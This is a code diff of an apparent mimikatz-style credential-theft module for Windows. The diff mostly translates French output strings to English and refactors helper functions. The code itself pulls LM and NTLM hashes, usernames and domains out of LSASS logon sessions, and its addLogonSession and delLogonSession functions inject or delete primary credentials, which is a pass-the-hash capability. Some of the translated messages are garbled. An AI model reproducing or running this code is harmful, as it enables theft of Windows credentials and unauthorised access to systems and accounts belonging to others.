@@ -16,7 +16,7 @@ bool searchMSVFuncs()
 __kextdll bool __cdecl getMSVFunctions(mod_pipe * monPipe, vector<wstring> * mesArguments)
 {
 	wostringstream monStream;
-	monStream << L"** lsasrv.dll ** ; Statut recherche : " << (searchMSVFuncs() ? L"OK :)" : L"KO :(") << L" - " << MSV1_0_MspAuthenticationPackageId << endl <<
+	monStream << L"** lsasrv.dll ** ; Research Status : " << (searchMSVFuncs() ? L"OK :)" : L"KO :(") << L" - " << MSV1_0_MspAuthenticationPackageId << endl <<
 		L"@GetCredentials     = " << SeckPkgFunctionTable->GetCredentials << endl <<
 		L"@AddCredential      = " << SeckPkgFunctionTable->AddCredential << endl <<
 		L"@DeleteCredential   = " << SeckPkgFunctionTable->DeleteCredential << endl <<
@@ -49,13 +49,11 @@ bool WINAPI getMSVLogonData(__in PLUID logId, __in mod_pipe * monPipe, __in bool
 				maReponse << L"lm{ " << lmHash << L" }, ntlm{ " << ntHash << L" }";
 			else
 			{
-				wstring userName(kiwiCreds->UserName.Buffer, kiwiCreds->UserName.Length / sizeof(wchar_t));
-				wstring domainName(kiwiCreds->LogonDomainName.Buffer, kiwiCreds->LogonDomainName.Length / sizeof(wchar_t));
 				maReponse << endl <<
-					L"\t * Utilisateur  : " << userName << endl <<
-					L"\t * Domaine      : " << domainName << endl <<
-					L"\t * Hash LM      : " << lmHash << endl <<
-					L"\t * Hash NTLM    : " << ntHash;
+					L"\t * Username     : " << mod_text::stringOfSTRING(kiwiCreds->UserName) << endl <<
+					L"\t * Domain       : " << mod_text::stringOfSTRING(kiwiCreds->LogonDomainName) << endl <<
+					L"\t * LM Hash      : " << lmHash << endl <<
+					L"\t * NTLM Hash    : " << ntHash;
 			}
 			SeckPkgFunctionTable->FreeLsaHeap(kiwiCreds);
 		}
@@ -85,12 +83,12 @@ __kextdll bool __cdecl delLogonSession(mod_pipe * monPipe, vector<wstring> * mes
 				idSecAppHigh = mesArguments->front(); idSecAppLow = mesArguments->back();
 			}
 
-			LUID idApp = wstringsToLUID(idSecAppHigh, idSecAppLow);
+			LUID idApp = mod_text::wstringsToLUID(idSecAppHigh, idSecAppLow);
 			if(idApp.LowPart != 0 || idApp.HighPart != 0)
-				maReponse << (NT_SUCCESS(NlpDeletePrimaryCredential(&idApp)) ? L"Suppression des données de sécurité réussie :)" : L"Suppression des données de sécurité en échec :(");
+				maReponse << (NT_SUCCESS(NlpDeletePrimaryCredential(&idApp)) ? L"Deleting data from successful security :)" : L"Deleting data security failure :(");
 			else maReponse << L"LUID incorrect !";
 		}
-		else maReponse << L"Format d\'appel invalide : delLogonSession [idSecAppHigh] idSecAppLow";
+		else maReponse << L"Format invalid call: delLogonSession [idSecAppHigh] idSecAppLow";
 	}
 	else maReponse << L"n.a. (msv KO)";
 
@@ -112,7 +110,7 @@ __kextdll bool __cdecl addLogonSession(mod_pipe * monPipe, vector<wstring> * mes
 			kiwicreds.LmPasswordPresent = FALSE;
 			kiwicreds.NtPasswordPresent = TRUE;
 
-			switch(mesArguments->size()) // méchants arguments utilisateurs
+			switch(mesArguments->size()) // bad arguments users
 			{
 			case 4:
 				idSecAppLow = mesArguments->front();
@@ -146,45 +144,28 @@ __kextdll bool __cdecl addLogonSession(mod_pipe * monPipe, vector<wstring> * mes
 				break;
 			}
 
-			LUID idApp = wstringsToLUID(idSecAppHigh, idSecAppLow);
+			LUID idApp = mod_text::wstringsToLUID(idSecAppHigh, idSecAppLow);
 
 			if(idApp.LowPart != 0 || idApp.HighPart != 0)
 			{
 				if((!kiwicreds.LmPasswordPresent || (lmHash.size() == 0x20)) && ntlmHash.size() == 0x20 && userName.size() <= MAX_USERNAME_LEN && domainName.size() <= MAX_DOMAIN_LEN)
 				{
-					InitLsaStringToBuffer(&kiwicreds.UserName, userName, kiwicreds.BuffUserName);
-					InitLsaStringToBuffer(&kiwicreds.LogonDomainName, domainName, kiwicreds.BuffDomaine);
+					mod_text::InitLsaStringToBuffer(&kiwicreds.UserName, userName, kiwicreds.BuffUserName);
+					mod_text::InitLsaStringToBuffer(&kiwicreds.LogonDomainName, domainName, kiwicreds.BuffDomaine);
 					if(kiwicreds.LmPasswordPresent)
 						mod_text::wstringHexToByte(lmHash, kiwicreds.LmOwfPassword);
 					mod_text::wstringHexToByte(ntlmHash, kiwicreds.NtOwfPassword);
 
-					maReponse << (NT_SUCCESS(NlpAddPrimaryCredential(&idApp, &kiwicreds, sizeof(kiwicreds))) ? L"Injection de données de sécurité réussie :)" : L"Injection de données de sécurité en échec :(");
+					maReponse << (NT_SUCCESS(NlpAddPrimaryCredential(&idApp, &kiwicreds, sizeof(kiwicreds))) ? L"Data injection successful security :)" : L"Injection security data failure :(");
 				}
-				else maReponse << L"Les hashs LM et NTLM doivent faire 32 caractères, le nom d\'utilisateur et le domaine/poste au maximum 22 caractères";
+				else maReponse << L"LM and NTLM hashes should be 32 characters, the username and domain / mail maximum of 22 characters";
 			}
 			else maReponse << L"LUID incorrect !";
 		}
-		else maReponse << L"Format d\'appel invalide : addLogonSession [idSecAppHigh] idSecAppLow Utilisateur {Domaine|Poste} [HashLM] HashNTLM";
+		else maReponse << L"Format invalid call: addLogonSession [idSecAppHigh] {idSecAppLow User Domain | Post}[HashLM] HashNTLM";
 	}
 	else maReponse << L"n.a. (msv KO)";
 
 	maReponse << endl;
 	return sendTo(monPipe, maReponse.str());
-}
-
-
-void InitLsaStringToBuffer(LSA_UNICODE_STRING * LsaString, wstring &maDonnee, wchar_t monBuffer[])
-{
-	RtlCopyMemory(monBuffer, maDonnee.c_str(), (maDonnee.size() + 1) * sizeof(wchar_t));
-	RtlInitUnicodeString(LsaString, monBuffer);
-}
-
-LUID wstringsToLUID(wstring &highPart, wstring &lowPart)
-{
-	LUID monLUID = {0, 0};
-	wstringstream z;
-	z << highPart; z >> monLUID.HighPart;
-	z.clear();
-	z << lowPart; z >> monLUID.LowPart;
-	return monLUID;
 }
